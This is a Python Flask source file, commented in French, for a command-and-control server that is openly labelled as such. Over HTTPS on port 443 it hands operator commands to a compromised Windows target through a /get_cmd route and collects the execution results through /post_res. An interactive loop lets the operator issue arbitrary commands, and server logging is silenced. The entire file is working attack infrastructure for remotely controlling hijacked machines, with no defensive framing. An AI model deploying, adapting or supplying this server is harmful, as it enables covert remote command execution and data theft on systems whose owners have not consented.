from flask import Flask, request
import threading
import logging


log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)


current_command = "whoami"

@app.route('/get_cmd', methods=['GET'])
def give_command():
    """La cible appelle cette route pour récupérer l'ordre"""
    global current_command
    if current_command:
        print(f"\n[+] Ordre envoyé à la cible : {current_command}")
        cmd_to_send = current_command

        return cmd_to_send
    return ""

@app.route('/post_res', methods=['POST'])
def receive_result():
    """La cible appelle cette route pour envoyer le résultat de l'exécution"""
    result = request.data.decode('cp1252', errors='ignore')
    print(f"\n[!] Résultat reçu du serveur Windows :\n{result}")
    print("\nEntrez une nouvelle commande (ou 'exit') : ", end="")
    return "OK", 200

def run_server():

    app.run(host='0.0.0.0', port=443, ssl_context='adhoc', debug=False)

if __name__ == '__main__':
    print("=== C2 SERVER (HTTPS) - INTERFACE ===")
    

    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    try:
        while True:
            cmd = input("\nEntrez une nouvelle commande (ou 'exit') : ")
            if cmd.lower() in ["exit", "quit"]:
                break
            current_command = cmd
    except KeyboardInterrupt:
        pass

    print("\n[*] Fermeture du serveur...")